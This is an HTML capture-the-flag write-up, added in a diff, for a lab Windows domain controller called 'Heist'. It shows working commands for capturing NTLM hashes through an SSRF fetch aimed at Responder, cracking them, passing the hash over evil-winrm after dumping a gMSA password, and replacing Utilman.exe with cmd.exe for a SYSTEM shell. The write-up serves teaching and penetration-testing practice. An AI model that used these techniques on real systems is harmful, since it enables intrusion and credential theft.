@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Heist &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Heist</h1>
+    <div class="meta">Target: <code>192.168.45.244</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">SSRF</span><span class="tag">NTLMCapture</span><span class="tag">Responder</span><span class="tag">WinRM</span><span class="tag">gMSA</span><span class="tag">SeRestorePrivilege</span><span class="tag">Utilman</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#ntlm-capture-via-ssrf-web-browser">NTLM Capture via SSRF Web Browser</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#bloodhound-gmsa-path">BloodHound, gMSA Path</a><a class="lvl3" href="#dumping-the-gmsa-password">Dumping the gMSA Password</a><a class="lvl3" href="#serestoreprivilege-utilman-replacement">SeRestorePrivilege, Utilman Replacement</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Heist is an Active Directory domain controller where a server-side web browser becomes an NTLM hash capture tool. Pointing the application's fetch functionality at Responder leaks the <code>enox</code> user's NTLMv2 hash, which cracks to a password. From there, BloodHound maps a path through a Group Managed Service Account: <code>enox</code> can read the gMSA password for <code>svc_apache$</code>, which holds SeRestorePrivilege. That privilege enables the Utilman.exe replacement trick, spawning a SYSTEM shell from the RDP login screen.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec)
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+8080/tcp open  http          Werkzeug/2.0.1 Python/3.9.0
+|_http-title: Super Secure Web Browser
+</code></pre>
+<p>The DC fingerprint (ports 88, 389, 636, 3268) confirms this is a domain controller. Port 8080 is unusual, it's a Python/Werkzeug web app titled "Super Secure Web Browser."</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="ntlm-capture-via-ssrf-web-browser">NTLM Capture via SSRF Web Browser</h3>
+<p>The web app on port 8080 fetches URLs on behalf of the user. Testing with an HTTP server on Kali confirms outbound requests reach us. The application makes the request using Windows-native HTTP, which means it will attempt NTLM authentication when talking to a server that challenges for it.</p>
+<p>Setting up Responder to capture the authentication:</p>
+<pre><code class="language-sh">sudo responder -I tun0
+</code></pre>
+<p>Submitting a URL pointing to Kali from the web browser causes the server to authenticate outbound, and Responder captures the NTLMv2 hash:</p>
+<pre><code>enox::HEIST:92881b21e5d93737:‹redacted›:0101000000...
+</code></pre>
+<p>The raw Burp request confirms the fetch parameter:</p>
+<pre><code class="language-http">GET /?url=http://192.168.45.244/test HTTP/1.1
+Host: 192.168.180.165:8080
+</code></pre>
+<blockquote>
+<p><strong>How Responder captures NTLMv2:</strong> when a Windows process connects to a UNC path or HTTP server that issues a 401 with <code>WWW-Authenticate: NTLM</code>, Windows automatically responds with an NTLMv2 challenge-response using the current user's credentials. Responder acts as the rogue server, issuing the challenge and recording the response. The captured blob isn't the password, it's a challenge-response derived from the NTLM hash, but it can be cracked offline with the same tools as any other hash.</p>
+</blockquote>
+<p>Cracking with John:</p>
+<pre><code class="language-sh">john hash --wordlist=/usr/share/wordlists/rockyou.txt
+‹redacted›       (enox)
+</code></pre>
+<p>Credentials:</p>
+<pre><code>enox : ‹redacted›
+</code></pre>
+<p>WinRM access confirmed:</p>
+<pre><code class="language-sh">evil-winrm -u 'enox' -p '‹redacted›' -i 192.168.180.165
+</code></pre>
+<p>Local flag:</p>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\enox\Desktop&gt; type local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="bloodhound-gmsa-path">BloodHound, gMSA Path</h3>
+<p><code>enox</code>'s home directory has a <code>todo.txt</code> mentioning a group managed service account for Apache. WinPEAS produces nothing directly useful, so BloodHound maps the relationships:</p>
+<ul>
+<li><code>svc_apache</code> is a gMSA (msDS-GroupManagedServiceAccount).</li>
+<li>Only members of the <strong>Web Admins</strong> group can retrieve its password.</li>
+<li><code>enox</code> is a member of Web Admins.</li>
+</ul>
+<p>Confirming with PowerShell:</p>
+<pre><code class="language-powershell">Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq &quot;msDS-GroupManagedServiceAccount&quot;}
+</code></pre>
+<h3 id="dumping-the-gmsa-password">Dumping the gMSA Password</h3>
+<p>GMSAPasswordReader extracts the NT hash for <code>svc_apache$</code>:</p>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\enox\Documents&gt; .\GMSAPasswordReader.exe --AccountName 'svc_apache'
+Calculating hashes for Current Value
+[*] Input username  : svc_apache$
+[*]       rc4_hmac  : ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>What gMSA passwords are:</strong> Group Managed Service Accounts have their passwords managed automatically by the domain controller and rotated on a schedule. The password is never set by a human, it's a 256-bit random blob. But the DC stores the current value encrypted in LDAP, and accounts with ReadGMSAPassword permission (here, Web Admins members) can retrieve the NT hash directly. That hash is pass-the-hashable with no cracking needed.</p>
+</blockquote>
+<p>Authenticating as <code>svc_apache$</code> with the hash (the <code>$</code> suffix is required):</p>
+<pre><code class="language-sh">evil-winrm -i 192.168.180.165 -u svc_apache$ -H ‹redacted›
+</code></pre>
+<h3 id="serestoreprivilege-utilman-replacement">SeRestorePrivilege, Utilman Replacement</h3>
+<p><code>svc_apache$</code> holds SeRestorePrivilege. This privilege allows writing to any file on the system regardless of the file's own ACL, including protected system binaries.</p>
+<p>The Utilman.exe trick: replace the Accessibility Tools binary on the RDP login screen with <code>cmd.exe</code>. When clicked from the lock screen (before any authentication), it spawns as SYSTEM:</p>
+<pre><code class="language-powershell">mv C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.old
+mv C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
+</code></pre>
+<blockquote>
+<p><strong>Why SeRestorePrivilege allows this:</strong> the privilege was designed to let backup software restore files to their original ACL-protected locations. It bypasses write permission checks on the destination file. An attacker with this privilege can overwrite any file the OS will execute with elevated rights, including accessibility helpers that run before login.</p>
+</blockquote>
+<p>RDP into the box with <code>enox</code>'s credentials (using <code>rdesktop</code> since <code>xfreerdp</code> errors on this build), then click the Accessibility Tools icon at the bottom right of the lock screen.</p>
+<h2 id="root-system">Root / SYSTEM</h2>
+<p>A CMD console spawns as SYSTEM directly from the lock screen:</p>
+<pre><code>proof.txt contents: ‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Web-fetch features are SSRF primitives.</strong> Any application that fetches a URL on your behalf can be aimed at Responder to leak NTLM hashes. Test every URL input field.</li>
+<li><strong>BloodHound before manual enumeration.</strong> The gMSA path was non-obvious from <code>net user</code> alone; BloodHound's attack path graph surfaced it in seconds.</li>
+<li><strong>SeRestorePrivilege is effectively SeDebugPrivilege-lite.</strong> It bypasses ACLs on file writes, making it trivial to overwrite any system binary. Utilman.exe is the classic target but any SYSTEM-executed binary works.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
